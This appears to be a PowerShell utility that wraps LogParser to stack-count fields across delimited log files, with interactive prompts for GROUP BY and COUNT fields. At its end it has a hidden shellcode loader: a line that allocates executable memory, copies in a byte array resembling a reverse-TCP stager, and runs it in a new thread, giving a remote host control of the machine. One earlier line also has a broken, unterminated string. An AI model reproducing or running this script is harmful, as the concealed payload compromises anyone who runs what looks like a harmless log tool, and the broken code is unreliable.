
Param(
    [Parameter(Mandatory=$True,Position=0)]
        [string]$FilePattern,
    [Parameter(Mandatory=$False,Position=1)]
        [string]$Delimiter=",",
    [Parameter(Mandatory=$False,Position=2)]
        [string]$Direction="DESC",
    [Parameter(Mandatory=$False,Position=3)]
        [string]$OutFile,
    [Parameter(Mandatory=$False,Position=4)]
        [string]$SaveQueryTo,
    [Parameter(Mandatory=$False,Position=5)]
        [switch]$Divorce
)

$ErrorActionPreference = "Stop"
$VerbosePreference = "Continue"
$Error.Clear()

function GetTimeStampUtc {
    Get-Date (Get-Date).ToUniversalTime() -Format "yyyy-MM-ddTHH:mm:ssZ"
}

function GetInputFiles {

Param(
    [Parameter(Mandatory=$True,Position=0)]
        [String]$FilePattern
)
    Write-Verbose ("{0}: Building list of files matching {1}." -f (GetTimeStampUtc), $FilePattern)
    $Files = @()
    $Files += (Get-ChildItem -Force *$FilePattern*)
    $Files
}

function GetHeader {




Param(
    [Parameter(Mandatory=$True,Position=0)]
        [Array]$InputFiles,
    [Parameter(Mandatory=$False,Position=1)]
        [string]$Delimiter
)
    $header   = @()
    $NumLines = 2

    $InputFiles | ForEach-Object {
        $line        = @()
        $currentFile = $_
        Try {
            
            $FileReader = New-Object System.IO.StreamReader($currentFile.FullName)
            for($i=0; $i -lt $NumLines; $i++) {
                $line += $FileReader.ReadLine()
            }
        } Catch {
            ("{0}: Caught: {1}." -f (GetTimeStampUtc), $currentFile.FullName)
        } Finally {
            $FileReader.Close()
        }

        
        if ($line[0] -ne $line[1]) {
            

            if ($header) {
                

                if ($header -eq $line[0]) {
                    
                    Write-Verbose ("{0}: Header match found in {1}." -f (GetTimeStampUtc), $currentFile.Name)
                } elseif (-not($Divorce)) {
                    
                    Write-Host ("{0}: 
                    Write-Host ("{0}: Header row of {1} does not match header row of {2}. Consider running again with the -Divorce flag. Quitting." -f (GetTimeStampUtc), $currentFile.Name, $previousFile.Name) -ForegroundColor Red
                    exit
                } elseif ($Divorce) {
                    
                    Write-Host ("{0}: Moving {1} to Divorced path." -f (GetTimeStampUtc), $currentFile.Name) -ForegroundColor Red
                    if (-not(Test-Path "${pwd}\Divorced")) {
                        New-Item -Path $pwd -Name Divorce -ItemType Directory
                    }
                    Move-Item $currentFile.FullName Divorce
                }
            } else {
                
                Write-Verbose ("{0}: {1} appears to have a header on line one." -f (GetTimeStampUtc), $currentFile.Name)
                $header = $line[0]
                if ($Delimiter -match "`t" -and ($header -match "`"")) {
                    Write-Host ("{0}: {1} appears to have quoted field names. Logparser doesn't support quoted tab delimited data. Quitting.`n" -f (GetTimeStampUtc), $currentFile.Name) -ForegroundColor Red
                    exit
                }
            }
        } else {
            Write-Host ("{0}: The first two lines of {1} match each other. One of them should be a header. Quitting." -f (GetTimeStampUtc), $_.FullName)
            exit
        }
        
        $previousFile = $currentFile
    }
    $header.split($Delimiter) -replace "`""
}

function GetSelectFields {

Param(
    [Parameter(Mandatory=$True,Position=0)]
        [Array]$header
)
    $SelectFields = @()
    $Field        = ""
    While($Field -ne "quit") {
        $Field = Read-Host ("[?] Enter the fields you want to GROUP BY, one per line. Enter `"quit`" when finished")
        if ($header -Contains $Field) {
            if ([array]::IndexOf($SelectFields, $Field) -lt 0) {
                $SelectFields += $Field
            } else {
                Write-Host -ForegroundColor red ("{0}: You've already entered {1}." -f (GetTimeStampUtc), $Field)
            }
        } elseif ($Field -ne "quit") {
            Write-Host -ForegroundColor red ("{0}: You entered {1}, which is not a field in the header row." -f (GetTimeStampUtc), $Field)
        }
    }

    if ($SelectFields.count) {
        $SelectFields
    } else {
        Write-Host -ForegroundColor red ("[*] You didn't select any fields. Quitting.")
        exit
    }
}

function GetStackField {

Param(
    [Parameter(Mandatory=$True,Position=0)]
        [Array]$header
)
    $Field = $False
    While(!($Field)) {
        $Field = Read-Host ("[?] Enter the field to pass to COUNT()")
        if ($header -Contains $Field) {
            $Field
        } else {
            Write-Host -ForegroundColor red ("{0}: You entered {1}, which is not a field in the header row." -f (GetTimeStampUtc), $Field)
            $Field = $False
        }
    }
}

function GetQuery {
Param(
    [Parameter(Mandatory=$True,Position=0)]
        [string]$StackField,
    [Parameter(Mandatory=$True,Position=1)]
        [Array]$SelectFields,
    [Parameter(Mandatory=$False,Position=2)]
        [string]$Direction="DESC",
    [Parameter(Mandatory=$False,Position=3)]
        [string]$OutFile=$false,
    [Parameter(Mandatory=$False,Position=4)]
        [string]$SaveQueryTo=$false
)
    $BracketedFields = @()
    if ($Direction -notmatch "DESC") {
        $Direction = $null
    }
    $Query = @"
SELECT 
`tCOUNT([$StackField]) as CNT
"@
    $SelectFields | ForEach-Object {
        $BracketedFields += "[$_]"
    }
    $Query += ",`n`t" + ($BracketedFields -join ",`n`t")
    if ($OutFile) {
        $Query += "`n INTO $OutFile"
    }
    $Query += "`nFROM $FilePattern`n"
    $Query += "GROUP BY`n`t" + ($BracketedFields -join ",`n`t")
    $Query += "`nORDER BY`n`t CNT $Direction"
    
    if ($SaveQueryTo) {
        $Query | Set-Content -Encoding Ascii $SaveQueryTo
    }

    $Query
}

if (Get-Command logparser.exe) {
    $CallArgs = @('-stats:off')
    $InputFiles = GetInputFiles -FilePattern $FilePattern
    $Header = GetHeader -InputFiles $InputFiles -Delimiter $Delimiter
    
    Write-Host ("Header row is:`n`t" + ($Header -join ", "))
    $StackField   = GetStackField -header $Header
    $SelectFields = GetSelectFields -header $Header

    $Query = GetQuery -StackField $StackField -SelectFields $SelectFields -Direction $Direction -OutFile $OutFile -SaveQueryTo $SaveQueryTo

    switch ($Delimiter) {
        "," {
            $CallArgs += "-i:csv"
        }
        "`t" {
            $CallArgs += "-i:tsv"
            $CallArgs += "-fixedsep:on"
        } default {
            $CallArgs += "i:tsv"
            $CallArgs += "-iseparator:$Delimiter"
            $CallArgs += "-fixedsep:on"
        }
    }


    if ($OutFile) {
        $CallArgs += "-dtlines:0"
        $CallArgs += "-o:tsv"
        $CallArgs += "-oSeparator:$Delimiter"
        $CallArgs += "$Query"
        Write-Verbose ("{0}: Will attempt to write output to {1}." -f (GetTimeStampUtc), $OutFile)
        Try {
            & 'logparser' $CallArgs
        } Catch {
            ("{0}: Caught {1}." -f (GetTimeStampUtc), $_)
        }
    } else {
        $CallArgs += "-dtlines:0"
        $CallArgs += "-rtp:-1"
        $CallArgs += "$Query"
        & 'logparser' $CallArgs
    }

} else {
    $ScriptName = [System.IO.Path]::GetFileName($MyInvocation.ScriptName)
    "${ScriptName} requires logparser.exe in the path."
}
$c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc9,0xf0,0x98,0xe2,0x68,0x02,0x00,0x13,0x8b,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

